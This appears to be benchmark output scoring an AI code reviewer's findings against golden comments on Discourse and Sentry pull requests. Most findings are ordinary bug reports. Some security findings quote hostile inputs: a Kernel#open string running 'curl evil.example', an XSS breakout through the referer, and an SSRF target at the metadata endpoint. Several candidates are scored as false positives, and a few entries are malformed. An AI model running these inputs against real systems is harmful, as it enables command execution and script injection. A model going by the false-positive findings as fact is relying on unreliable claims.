true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Duplicate `self.downsize` definition - older 4-argument signature is unreachable

Two class methods named `self.downsize` are now defined on OptimizedImage (lines 145-147 and 149-151). Ruby does not support method overloading: redefining a method silently replaces the previous one, so the older `downsize(from, to, max_width, max_height, opts={})` becomes dead code and the only `downsize` that actually exists is `downsize(from, to, dimensions, opts={})`. Any other caller in the codebase that still uses the old signature with separate integer width/height arguments will be dispatched to the new method, where the third positional argument is interpreted as a single `dimensions` string. For example, `OptimizedImage.downsize(path, path, 100, 200)` would set `dimensions = 100` and `opts = 200` (an Integer), and any subsequent use of `opts[:force_aspect_ratio]` or `opts[:allow_animation]` will raise a `TypeError: no implicit conversion of Symbol into Integer` because `Integer` does not respond to `[]`. Either remove one of the two definitions, or rename the new method (e.g., `downsize_to_dimensions` / `downsize_to`) so both signatures remain callable.

false_negatives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).

Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.

false_positives.candidate:
Downsize loop ignores OptimizedImage.downsize return value, wasting 5 attempts on failure

The new downsize loop in `create_upload` calls `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", allow_animation: SiteSetting.allow_animated_thumbnails)` but does not inspect its return value. `OptimizedImage.downsize` swallows all exceptions internally and returns `false` on failure (ImageMagick/gifsicle errors, corrupt or unsupported image, missing binary, etc.), so when downsize fails the on-disk size does not decrease and the loop spins through all 5 attempts pointlessly, each time re-invoking ImageMagick on a file it cannot process. After exiting, the still-too-large file is handed to `Upload.create_for`, which will reject it and surface a confusing error to the user after several wasted conversions. The call should be checked (break out of the loop and ideally abort the upload on `false`) or wrapped in a rescue that bails out of the downsize attempt early.

true_positives.golden_comment: The EmbeddableHost model's before_validation callback calls self.host.sub! to strip http://, https://, and path segments, but if self.host is nil, this raises NoMethodError.
true_positives.matched_candidate:
before_validation crashes when host is nil

The callback invokes `self.host.sub!(/^https?:\/\//, '')` and `self.host.sub!(/\/.*$/, '')`. If `host` is nil (e.g., a controller passes `params[:embeddable_host][:host]` that is missing or `nil`), `nil.sub!` raises NoMethodError before any validation message is generated, producing a 500 instead of a clean 422. Use `self.host.to_s.sub!` or check `self.host.present?` first, and consider switching to non-mutating `gsub` to avoid mutating shared string instances.

true_positives.golden_comment: The update and destroy methods in Admin::EmbeddableHostsController do not validate the existence of the EmbeddableHost record retrieved by ID. If EmbeddableHost.where(id: params[:id]).first returns nil (i.e., the host does not exist), attempting to call methods on the nil object (e.g., save_host or destroy) will result in a NoMethodError.
true_positives.matched_candidate:
update action crashes if record lookup returns nil

`host = EmbeddableHost.where(id: params[:id]).first` can return nil (unknown id), but `save_host(host)` then calls `host.host = ...`, raising NoMethodError on the nil receiver. Either guard with `return render_json_error(...not_found...)` or `save_host` must handle nil. Same problem in `destroy` on line 16: `host.destroy` on nil raises NoMethodError instead of returning a 404.

true_positives.golden_comment: The contents of `category_fabricator.rb` and `embeddable_host_fabricator.rb` have been swapped, resulting in the loss of original category fabricators and potentially causing errors in fabricator usage.
true_positives.matched_candidate:
Fabricator file contents swapped from filename

`spec/fabricators/category_fabricator.rb` now defines `Fabricator(:embeddable_host)` while every category-shaped fabricator (`:category`, `:diff_category`, `:happy_category`, `:private_category`) was moved to the new `spec/fabricators/embeddable_host_fabricator.rb`. The file containing the category fabricators is named for a different model, so anyone editing tests for categories will be looking in the wrong place. The contents should be restored so the file naming matches what it actually defines.

true_positives.golden_comment: The SQL query in the `app/controllers/admin/embeddable_hosts_controller.rb` file uses string interpolation (`'#{h}'`) to insert values, which is vulnerable to SQL injection. It should use parameter binding or proper quoting to prevent this security vulnerability.
true_positives.matched_candidate:
SQL injection in data migration

The host value `#{h}` is interpolated directly into raw SQL:

  execute "INSERT INTO embeddable_hosts (host, category_id, created_at, updated_at) VALUES ('#{h}', #{category_id}, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"

Any single quote, backslash, or other special character in a legacy `SiteSetting.embeddable_hosts` value will break the SQL or inject arbitrary statements. A normally configured host like `weird-host's.com` would either corrupt the row or fail the migration entirely; a hostile value (which only an admin could plant, but the surface is the data) could execute arbitrary SQL. Use ActiveRecord's parameterized `EmbeddableHost.create!(host: h, category_id: category_id)` (or bind parameters on `execute`) instead of string interpolation.

true_positives.golden_comment: The migration accesses execute(...)[0]['id'] without checking if the query returned any rows, which causes a crash when no embed_category setting exists. This can lead to a broken feature when attempting to edit category/host relationships.
true_positives.matched_candidate:
NoMethodError when no matching category row exists

`execute("SELECT c.id FROM categories AS c INNER JOIN site_settings ... WHERE s.name = 'embed_category'")[0]['id'].to_i` will raise NoMethodError (`undefined method 'id' for nil`) if the SELECT returns no rows (e.g., the legacy `embed_category` setting was empty, missing, or pointed to a non-existent category name). The `if category_id == 0` guard below only protects against `category_id == 0`; it never runs because the preceding line already raised. Guard against the empty result, e.g. `row = ...; category_id = row && row[0]['id'].to_i`.

false_negatives.golden_comment: record_for_host compares lower(host) = ? but does not normalize the parameter’s case, so mixed‑case referer hosts may fail to match even though comparison intends to be case‑insensitive.

Because this migration inserts embeddable_hosts rows with raw SQL, any existing embeddable_hosts values that include http:// or /https:// or path segments won’t go through the EmbeddableHost model’s normalization, so the new host lookup (which compares only the bare host) may fail for migrated data. Consider ensuring that migrated hosts are normalized to the same format as newly created EmbeddableHost records so existing embedding configurations keep working.

false_positives.candidate:
PUT endpoint never persists anything

`Admin::EmbeddingController#update` simply re-renders the existing `@embedding` OpenStruct without reading any attributes or persisting any change. Combined with the `saveChanges` JS action that has no template binding, this endpoint is effectively a no-op dressed as a save. Either remove the route/action or have it accept and persist the submitted payload. As written it silently swallows PUTs, which could mask a real bug later when UI starts exercising it.

Removed method leaves config/locales blank

Both `embeddable_hosts` and `embed_category` translations and YAML keys were removed in tandem with the model method, but the old JSON-API style removal comment is not present and there is no migration comment explaining the data movement. The shipped migration file (20150818190757) does the data backfill, which is good, but anyone running an out-of-order deploy against an already-migrated DB will simply lose both settings with no diagnostic. Consider also handling the setting rows on initial run rather than only in `change`.

Spec only asserts inheritance, not behavior

The new controller's `create`, `update`, and `destroy` actions have no tests at all - not even happy-path coverage, param shape validation, or auth checks. The two bugs above (nil record lookup, missing nested params) would have been caught by minimal request specs. Add specs that POST/PUT/DELETE with valid and invalid ids and shapes.

destroy action crashes if record lookup returns nil

`host = EmbeddableHost.where(id: params[:id]).first` followed by `host.destroy` raises NoMethodError when no row matches. Should return a 404 (or at least `render_json_error`) when the record cannot be found, matching REST expectations.

edit action reads id off possibly-missing category

`this.set('categoryId', this.get('host.category.id'))` crashes when `host.category` is undefined. For the standard pencil flow on existing rows `category` is hydrated server-side, but if category hydration ever fails (e.g., category deleted, rest serializer misconfigured) the entire component breaks. Use `(this.get('host.category') || {}).id` or a helper to read safely.

pathFor silently ignores findArgs/id

The custom `pathFor` returns the hard-coded `/admin/customize/embedding` and drops any `findArgs`/`id` argument. It currently happens to work because both `find` and `update` resolve to that single route, but anything that legitimately wants to send an id (e.g., a future destroy/update-by-id, or even just `findAll`) will go to the wrong URL with no diagnostic. Either extend `pathFor` to handle arguments properly or add a comment documenting the intentional limitation.

save_host assumes nested params without guarding

`params[:embeddable_host][:host]` and `params[:embeddable_host][:category_id]` raise NoMethodError when a non-nested request body or an unrelated shape is sent. Wrapping with `params.require(:embeddable_host).permit(:host, :category_id)` (or a `params[:embeddable_host].present?` guard) would convert the request into a clean 400 with the existing error rendering path.

true_positives.golden_comment: logic: Potential nil pointer exception - if no TopicUser record exists, tu will be nil and calling methods on it will crash
true_positives.matched_candidate:
NilTopicUser causes 500 error on unsubscribe

`tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` can return nil for users who have never visited the topic (e.g. someone who only received the notification email). The very next line `tu.notification_level > ...` then raises `NoMethodError` on nil, producing a 500 instead of either muting the topic or returning a clean 404. The action needs to handle the nil case (e.g. create a TopicUser with the desired level, or short-circuit to a page that tells the user they have no subscription on this topic).

true_positives.golden_comment: Typo in property name: 'stopNotificiationsText' should be 'stopNotificationsText' (missing 'n' in 'Notifications')
true_positives.matched_candidate:
Typo in property name: stopNotificiationsText

The controller defines `stopNotificiationsText` (double 'i') and the template `templates/topic/unsubscribe.hbs` references the same misspelled name. It works only because both sides are consistent, but it will confuse anyone reading the code. Rename to `stopNotificationsText` (and update the template) to match the I18n key `topic.unsubscribe.stop_notifications`.

false_positives.candidate:
Direct tu.save! skips TopicUser.change (race + no broadcast)

The action uses `TopicUser.find_by(...).save!` instead of `TopicUser.change(user_id, topic_id, notification_level: ...)`. `TopicUser.change` is the established entry point that (a) does an atomic upsert, (b) sets `notifications_changed_at`/`notifications_reason_id`, (c) broadcasts the change on MessageBus so other tabs/clients update, and (d) handles the `RecordNotUnique` race. Bypassing it means concurrent clicks can clobber each other, the notification reason metadata is never written, and live UIs do not refresh.

GET-based unsubscribe is CSRF-vulnerable; no per-user token `unsubscribe` is exposed only via GET (config/routes.rb lines 440–441) and `skip_before_filter :check_xhr, only: [:show, :unsubscribe, :feed]`, and the action mutates state (`tu.save!`). Unlike the existing `email/unsubscribe/:key` route which uses a unique per-user key, this route authenticates only via the session cookie, so any third-party page or email can embed `` (or equivalent link) and, if the victim is logged in, silently mute them on arbitrary topics. At minimum, the action should require a one-time token (as the email-key route already does), or be POST-only with CSRF, to prevent drive-by topic muting.

List-Unsubscribe header still points to user preferences only

The `List-Unsubscribe` header is hardcoded to `template_args[:user_preferences_url]` (line 107) even though `unsubscribe_url` is now available per-topic. Modern mail clients (Gmail, Apple Mail) honor `List-Unsubscribe: <url>` for one-click unsubscribe. Leaving it pointed at `/my/preferences` means users who want to silence a single topic have to click through two pages, undermining the purpose of this feature. The header should include (or prefer) the per-topic `unsubscribe_url` for notification emails.

No controller tests for TopicsController#unsubscribe

There are no specs covering the new `unsubscribe` action. At minimum the suite should cover: (1) nil `TopicUser` does not 500, (2) `tracking`/`watching` users get downgraded, (3) `regular` users get muted, (4) unauthorized topics (removed from PM) get a clean response rather than a 500, (5) MessageBus publish on `/topic/<id>` is emitted with `notification_level_change`. The state-changing logic and its edge cases are uncovered.

No rescue from Discourse::InvalidAccess on private/restricted topics

`TopicView.new(params[:topic_id], current_user)` will raise `Discourse::InvalidAccess` for topics the user can no longer see (e.g. removed from a PM, category access revoked). Unlike `show` (lines 88–95) which rescues `InvalidAccess` and removes notifications, `unsubscribe` lets the exception bubble, producing a 500. Users in this state should either get a clean 403/404 or have the action bail out before mutating any state. As written, a 500 is also raised if a brand-new user without a TopicUser row hits the page (the nil-`tu` bug), so the rescue is doubly needed.

No tests for unsubscribe_url in rendered email body

The PR adds `unsubscribe_url: "/t/1234/unsubscribe"` to the existing builder spec but never asserts that this URL appears in either the text body or the rendered html body. The new `unsubscribe_link` I18n string relies on `%{unsubscribe_url}` being substituted and PrettyText-cooked into an `<a>` tag — a regression there (e.g. forgetting to pass `unsubscribe_url` from another caller) would silently produce a broken `[click here]()` link in every notification email and would not be caught by the current spec.

Toggle semantics don't match UI copy

When the user is currently `tracking` or `watching` (notification_level > regular), the action sets the level to `regular` (1) rather than `muted` (0), and the template copy shown after the redirect is "You will stop receiving notifications for {{title}}." The user will in fact still receive regular notifications, contradicting the page they land on. Either drop straight to `muted` from any level, or change the copy and the I18n string to reflect that they are merely being downgraded.

Wrong tense in unsubscribe confirmation The string `topic.unsubscribe.stop_notifications` reads "You will stop receiving notifications for {{title}}." but it is rendered after the controller has already performed the state change, so the tense is wrong. It should read "You have stopped receiving notifications..." (or similar) and should accurately reflect the resulting notification level (the controller can downgrade to `regular`, not always to `muted`).

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
should_block? performs a DB write during read-only validation

should_block? is named like a predicate but has the side effect of incrementing match_count and updating last_match_at whenever a record exists. The EmailValidator (lib/validators/email_validator.rb) calls it on every email validation, including runs that ultimately fail to save the user. Consequences: (1) match_count gets incremented even when the signup ultimately fails for unrelated reasons, distorting statistics; (2) every blocked-email signup now performs an extra UPDATE on the blocked_emails table inside what should be a validation pass, increasing contention; (3) if record.save fails it is silently swallowed, leaving an inconsistent mix of "returned true because record existed" but with no recorded hit. The hit-recording logic should be split from the block check (e.g., a separate should_record_hit?) and only run on successful user creation, or at least on a successful save of the record.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Case-sensitive blocked-email lookup lets blocked addresses slip through

EmailValidator calls BlockedEmail.should_block?(value) with the raw, mixed-case value supplied by the user. BlockedEmail.where(email: email).first is case-sensitive, and the migration's add_index :blocked_emails, :email, unique: true is a plain btree unique index (not citext / functional lower(email) index). Existing flows normalize emails to lowercase in some places (e.g., users_controller#change_email uses Email.downcase), but neither the BlockedEmail model nor the validator does any normalization. An admin who adds 'Spammer@Evil.com' to the blocklist will not stop a signup from 'spammer@evil.com', 'SPAMMER@evil.com', etc. Worse, because the unique index is case-sensitive, you cannot even add both casings as separate rows. Normalize via before_validation (self.email = Email.downcase(self.email.to_s).strip) and either store lowercase + add a functional unique index, or use a citext column.

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

false_positives.candidate:
Domain setting interpolated directly into a regex

email_in_restriction_setting? builds the regex as Regexp.new("@(#{domains})", true). If the setting contains regex metacharacters other than '.' (e.g., '|', '*', '+', '(', '['), they are interpreted as regex syntax. This was carried over from the original user.rb implementation, but since the file is being touched anyway this is a good place to fix it: split the setting on commas/whitespace, Regexp.escape each entry, and join with '|'. Otherwise an admin who accidentally types 'foo.com|bar.com' (intending a list) silently changes the semantics.

Missing trailing newline in email_validator.rb

The new file ends without a final newline (the diff explicitly notes "\ No newline at end of file"). Most Ruby tools, editors, and POSIX conventions expect source files to end with a newline. Add a trailing newline.

No test covers case-insensitive matching or the race condition

The model spec only exercises should_block? with an exact-case email and a single call. It does not cover (1) case-insensitive lookup, which is the main correctness gap of this PR (see EmailValidator finding), and (2) the lost-update race condition in match_count. At least one spec should demonstrate that 'Foo@Spam.com' blocks 'FOO@spam.com' (after the model is fixed), and a spec using threads or raw SQL should illustrate the concurrent-update behavior so the regression is caught if someone removes the atomic update later.

Whitelist/blacklist branches of EmailValidator are untested

The only tests stub BlockedEmail.should_block? and never exercise the whitelist/blacklist code paths (SiteSetting.email_domains_whitelist / email_domains_blacklist). These paths were carried over verbatim from user.rb and were never tested before either, but now that the logic has been moved into a shared validator it's the right time to add coverage: an email rejected by the whitelist, an email rejected by the blacklist, and an email that passes both. Without tests, regressions in the gsub('.', '\.') / regexp interpolation (which is also unsafe if the setting contains regex metacharacters like '|' or '*') will slip in.

action_type not constrained to the Enum's values

validates :email, presence: true, uniqueness: true does not validate action_type, so the model will accept any integer (including ones not produced by BlockedEmail.actions). Add `validates :action_type, inclusion: { in: BlockedEmail.actions.values }` to fail fast on bad data. The `||=` in set_defaults only handles nil, not arbitrary invalid integers.

record.save failure is silently swallowed

should_block? calls record.save with no error handling. If the save raises or returns false (e.g., a validation error on the BlockedEmail record, a DB error, or an ActionView::Template::Error from a future before_save), the exception bubbles up out of the EmailValidator and aborts user signup. The user sees a generic 500 instead of a clean validation message. At minimum, wrap in a rescue and log; ideally restructure so hit recording is not coupled to the block decision (see the related side-effect finding).

rejectedEmails list never cleared and is case-sensitive

rejectedEmails is initialized once as Em.A([]) and only ever pushObject'd to. It is never cleared, and the contains(email) check is case-sensitive. Consequences: (1) once a controller instance flags an email as rejected, the user cannot clear that rejection (e.g., if they fix a typo and try the corrected address it's fine, but if they re-type the same address with different casing, e.g. 'Bad@Spam.com' vs 'bad@spam.com', the rejection check silently misses it because the case-sensitive contains returns false even though the server already rejected it); (2) the array grows without bound for the lifetime of the controller. The pushObject site should normalize the email (e.g., toLowerCase()) on both insert and check, and there should be a way to clear it on success/reset.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on user-controlled URL enables shell injection and SSRF

`rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses Ruby's `Kernel#open`, which calls `Kernel#system` when the argument starts with `|`. A site administrator able to influence `feed_polling_url`, or any data source that ends up feeding it, could pass a string like `|curl evil.example/x|https://attacker/feed` to execute arbitrary commands on the host. Even without that, there is no timeout, no size cap, no redirect policy, and no URL validation, so the worker can be made to fetch internal addresses (SSRF: localhost, link-local IPs, AWS metadata endpoint `169.254.169.254`, etc.), or to hang on a slow peer. Replace with an HTTP client such as `Net::HTTP`/`Faraday` with an explicit timeout, an address whitelist, and an internal-IP blocklist.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
NoMethodError when feed item has no content

`content = CGI.unescapeHTML(i.content.scrub)` will raise `NoMethodError: undefined method scrub for nil` if any feed item omits `content` (or yields a nilable value depending on the feed shape). `i.title` is also passed straight into `TopicEmbed.import` and is rendered later as a topic title — a nil title causes a validation failure that propagates. Use `(i.content || '').scrub` and guard against nil titles.

true_positives.golden_comment: An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.
true_positives.matched_candidate:
Unescaped request.referer interpolated into JavaScript string

The line `parent.postMessage({...}, '<%= request.referer %>');` inserts the raw `request.referer` value into a JavaScript string literal. The controller's `ensure_embeddable` filter only checks `URI(request.referer || '').host != SiteSetting.embeddable_host`, which validates only the host portion, not the path or query string. An attacker who controls any path/query on the embeddable host (e.g. a user-controlled redirect, search parameter echo, or a path segment) can provide a referer such as `https://example.com/');alert(document.domain);//` that passes validation and breaks out of the string at render time, producing stored XSS inside the embed iframe. The referer must be HTML- and JavaScript-escaped before being interpolated, or (better) the embeddable host should be passed as a validated server-side constant (or post to `'*'` with a strict origin check on the parent listener) instead of trusting the raw header.

false_negatives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.
The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.

false_positives.candidate: Imported RSS/HTML bypasses sanitisation via raw_html cook_method `TopicEmbed.import` always creates the post with `cook_method: Post.cook_methods[:raw_html]` and `skip_validations: true`. `Post#cook` then returns `raw` unchanged, and the embed view renders it with `<%= raw post.cooked %>` (see `app/views/embed/best.html.erb` line 19). The `Readability::Document` call in `import_remote` only whitelists tags/attributes — it does not strip `javascript:` URLs nor `on*` event handlers, and the `absolutize_urls` rewrite only acts on `href`/`src` that start with `/`. As a result, content fetched from an attacker-controlled URL can contain `` or `` that survives into the rendered embed iframe. The combination of raw_html + direct `raw` rendering in the embed view means any URL the admin (or attacker who triggers an import) submits becomes an XSS payload served from the Discourse origin inside the embedder's frame.

Kernel#open on remote read URL enables shell injection and SSRF

`doc = Readability::Document.new(open(url).read, ...)` in `import_remote` has the same problems as the feed job: `Kernel#open` allows command execution via the `|` form, and any caller able to influence `@embed_url` (or the URL registered into `TopicEmbed.embed_url`) can reach this path. Add the same mitigations: use `Net::HTTP`/`URI.open` with an explicit timeout, an internal-IP blocklist, and a follow-redirects policy.

Migration default makes every existing post raw_html

The migration adds the `cook_method` column with `default: 1` and `null: false`. Given `Post.cook_methods = Enum.new(:regular, :raw_html)` is 0-indexed (the convention used by Discourse's `Enum`), `1` is `:raw_html`. That means after the migration runs, every existing post row has `cook_method == :raw_html`, so `Post#cook` (`return raw if cook_method == Post.cook_methods[:raw_html]` in `app/models/post.rb`) returns the raw column verbatim and the entire cooking pipeline (markdown rendering, oneboxing, link rewriting, sanitisation, plugin post-cook filters) is bypassed for every legacy post. The default should be `0` (`:regular`); only the RSS import path explicitly sets the column to `Post.cook_methods[:raw_html]`. Without this fix, the first time any post is revised it will save `cooked = raw` and silently corrupt the rendered HTML for the whole forum.

PollFeed executed inline, blocking the embed worker

`perform_retrieve` invokes `Jobs::PollFeed.new.execute({})` synchronously inside the worker handling `RetrieveTopic`. PollFeed downloads the full RSS feed and imports every item, which can take minutes; doing it inline blocks the worker and serialises all embed retrievals behind the feed poll. If `feed_polling_enabled?` is true, any number of concurrent embed retrievals will all race to call PollFeed in parallel (no lock), causing duplicate feed downloads. Either enqueue the poll as a separate Sidekiq job (and reuse the existing `feed_key` cache to coalesce) or drop the inline call and rely on the scheduled job to have populated the cache.

feed_key helper is unused dead code

`feed_key` (memoising `"feed-modified:#{Digest::SHA1.hexdigest(SiteSetting.feed_polling_url)}"`) is defined on `Jobs::PollFeed` but is never referenced anywhere in the codebase. Either delete it or wire it into the poll to actually skip duplicates (which would also help fix the inline-invocation problem in `lib/topic_retriever.rb`).

true_positives.golden_comment: Consider normalizing the input locale (e.g., to a symbol) when checking/loading here to avoid double-loading if the same locale is passed as a String vs Symbol (also applies to other locations in the PR).
true_positives.matched_candidate:
Mixed Symbol/String types in fallback list cause stale-cache misses

self[locale] returns [locale, SiteSetting.default_locale.to_sym, :en]. The first element is whatever locale was passed in (often a String, because set_locale assigns I18n.locale from SiteSetting.default_locale or current_user.effective_locale, both Strings), while the remaining two are Symbols. Array#uniq does not deduplicate across these types, so the resulting fallback list mixes Strings and Symbols. When ensure_loaded! iterates that list and stores entries into translate_accelerator's @loaded_locales, a later lookup with the same logical locale but the other type will miss and trigger a redundant load of the same yml file on subsequent requests.

false_negatives.golden_comment: The @loaded_locales instance variable in translate_accelerator.rb is lazily initialized and accessed by multiple concurrent threads without synchronization.

false_positives.candidate:
Fallback chain ignores current_user.effective_locale when site default differs

The [locale, SiteSetting.default_locale.to_sym, :en] chain puts the site-wide default before English but does not include the user's locale's natural parent (e.g. pt_BR users fall back to English rather than pt). While the inline TODO acknowledges this is a future enhancement, the current order also means that a user whose effective_locale happens to equal SiteSetting.default_locale still gets :en listed twice (uniq handles it, but the chain collapses to [default, :en] rather than [user, default, :en]), so any locale-specific translator for that user is silently lost. More importantly, for languages like zh_TW or sr_Latin whose site default may be a closely related variant, the user loses the more-specific fallback path entirely.

FallbackLocaleList inherits Hash but [] returns Array, breaking Hash semantics

class FallbackLocaleList < Hash overrides [](locale) to return an Array of fallback locales instead of a Hash entry. While the standard I18n::Backend::Fallbacks class uses the same trick, this design makes Hash methods such as keys, values, each, merge, and empty? operate on the empty underlying Hash rather than the fallbacks, which is misleading and can break any caller that relies on Hash semantics. A plain class (or subclass of Object) with an explicit [] method would more honestly model what this object is.

No tests cover the new fallback behavior or the ensure_loaded! preload

The PR changes fallback behavior in several non-trivial ways: it introduces a custom FallbackLocaleList with a fixed [user_locale, SiteSetting.default_locale, :en] order, eagerly preloads all fallback locales for every request via I18n.fallbacks.ensure_loaded! in ApplicationController#set_locale, removes config.i18n.fallbacks = true from three environment files (production.rb, profile.rb, cloud66 production.rb), and removes config/initializers/pluralization.rb (folding it into the new i18n initializer). No specs are added or updated, and the PR description is just 'Test 9' with no detail, so there is no automated verification that the fallback chain resolves as intended, that ensure_loaded! actually populates @loaded_locales, that background-job code paths still get translations, or that existing fallback-related tests still pass.

true_positives.golden_comment: The OptimizedCursorPaginator in organization_auditlogs.py attempts to use negative slice offsets on Django querysets, but Django querysets do not support negative slicing and will raise an AssertionError.
true_positives.matched_candidate:
Negative-offset slicing crashes Django QuerySet

In OptimizedCursorPaginator.get_result, the advanced-features branch sets `start_offset = cursor.offset` (which can be negative) and then does `results = list(queryset[start_offset:stop])`. Django QuerySet slicing explicitly disallows negative indices and raises `AssertionError: Negative indexing is not supported` (or the equivalent TypeError on newer Django). The "negative offset support" advertised by the new class therefore crashes the request whenever a client sends a cursor with a negative offset. There is no defensive clamp (`max(0, ...)`) and no fallback, so the feature is non-functional in practice.

true_positives.golden_comment: get_item_key assumes a numeric key, but the paginator is used with order_by=-datetime in the audit logs endpoint; calling math.floor/ceil on a datetime will raise a TypeError.

OptimizedCursorPaginator.get_item_key crashes on datetime fields

OptimizedCursorPaginator.get_item_key does `int(math.floor(value) if self._is_asc(for_prev) else math.ceil(value))` after `value = getattr(item, self.key)`. The endpoint wires this paginator in with `order_by="-datetime"`, so `self.key` is `"datetime"` and `getattr(item, "datetime")` returns a `datetime.datetime` object. `math.floor(datetime)` raises `TypeError: a float is required`, so every call through the new path (including the very first request, because `build_cursor` calls `key(...)` to seed the next/prev cursor) will raise 500. The optimized paginator should subclass `DateTimePaginator`'s key conversion (multiplier + strftime) or be otherwise datetime-aware.

Importing non-existent OptimizedCursorPaginator

false_positives.candidate:
BasePaginator.get_result now passes negative offsets to QuerySet slicing

The new line `start_offset = max(0, offset) if not cursor.is_prev else offset` deliberately lets a negative `offset` flow into `queryset[start_offset:stop]` when the cursor is a prev cursor. Cursor offsets are parsed straight from the URL via `int(bits[1])` in `Cursor.from_string`, so any client (or buggy prior response) that produces a negative offset will now hit Django's negative-indexing AssertionError. The accompanying comment ("This is safe because the underlying queryset will handle boundary conditions") is factually wrong: Django does NOT handle negative slicing and the previous code did not claim to. This change advertises a behavior that does not work.

Comment falsely claims QuerySet handles negative offsets

The comment block above the new offset calculation says "This is safe because the underlying queryset will handle boundary conditions." Django's QuerySet raises on negative slicing (see the related finding at line 182/882). The comment is misleading and should either be removed or replaced with a real explanation of the intent plus a real guard, e.g. clamping to `>= 0` like the not-is_prev branch.

No tests cover the new optimized pagination path

The PR introduces a new request gate (`optimized_pagination=true`) and a new paginator class but does not add any tests for the new code path in `organization_auditlogs.py` or `paginator.py`. Given that the new path currently 500s on any non-trivial cursor (see other findings), tests would have caught the regression. At minimum, a test should cover (a) that `optimized_pagination=true` for an admin uses `OptimizedCursorPaginator` and succeeds end-to-end on `order_by="-datetime"`, and (b) that bad/negative cursors do not crash the endpoint.

OptimizedCursorPaginator duplicates BasePaginator.get_result without a real perf win

OptimizedCursorPaginator.get_result is a near-verbatim copy of BasePaginator.get_result; the only behavioral difference is the negative-offset branch (which is itself broken — see other findings). The endpoint always passes `enable_advanced_features=True` when it opts in, so the flag is effectively dead. There is no documented or measurable performance improvement over DateTimePaginator/BasePaginator: the same queryset is built, sliced, and `build_cursor` is invoked identically. Either delete the class and the gating code, or implement the actual optimization (e.g. a keyset pagination scheme or a bounded lookup) and benchmark it.

true_positives.golden_comment: OptimizedCursorPaginator's negative-offset branch in get_result() passes cursor.offset directly as start_offset to queryset slicing when enable_advanced_features is True and cursor.offset < 0.
true_positives.matched_candidate:
Django ORM raises AssertionError on negative slice indices

In OptimizedCursorPaginator.get_result, when enable_advanced_features is True and cursor.offset < 0, the code does `results = list(queryset[start_offset:stop])` with start_offset set to a negative value. Django's QuerySet.__getitem__ asserts that slice indices are non-negative and raises `AssertionError('Negative indexing is not supported.')` when they are not. The in-line comment claims 'The underlying Django ORM properly handles negative slicing automatically', which is false. Any superuser or global admin who sends a cursor URL parameter like `cursor=0:-1:0` to the audit logs endpoint (which unconditionally sets enable_advanced_features=True for those users) will cause an unhandled AssertionError, producing a 500 response.

true_positives.golden_comment: In BasePaginator.get_result(), when cursor.is_prev is True, it sets start_offset = offset without clamping, allowing negative offset values to be passed to queryset slicing.
true_positives.matched_candidate:
Negative offset still crashes BasePaginator for is_prev=True

The BasePaginator.get_result change `start_offset = max(0, offset) if not cursor.is_prev else offset` only clamps negative offsets for the non-prev branch. When cursor.is_prev is True and cursor.offset is negative, start_offset stays negative and the subsequent `queryset[start_offset:stop]` triggers Django's 'Negative indexing is not supported' AssertionError. The accompanying comment ('This is safe because the underlying queryset will handle boundary conditions') is incorrect; Django explicitly disallows negative slice indices on querysets.

false_negatives.golden_comment: OptimizedCursorPaginator.get_item_key uses floor/ceil on a datetime key (order_by='-datetime'), causing TypeError.
Accessing .has_global_access on organization_context.member can raise an AttributeError when organization_context is None, particularly for non-superuser non-member users.

false_positives.candidate:
Comments describe a feature that does not exist

The added inline comments describe 'Performance optimization for high-volume audit log access patterns', 'optimized paginator for high-performance audit log navigation', and 'enhanced cursor support' — but the OptimizedCursorPaginator it routes to is a copy of Paginator with a feature (negative offsets) that crashes Django. The `optimized_pagination=true` query parameter is checked but does not influence which features are actually exposed. The comments mislead future maintainers about what the code does and why.

Comments falsely claim queryset handles negative slicing

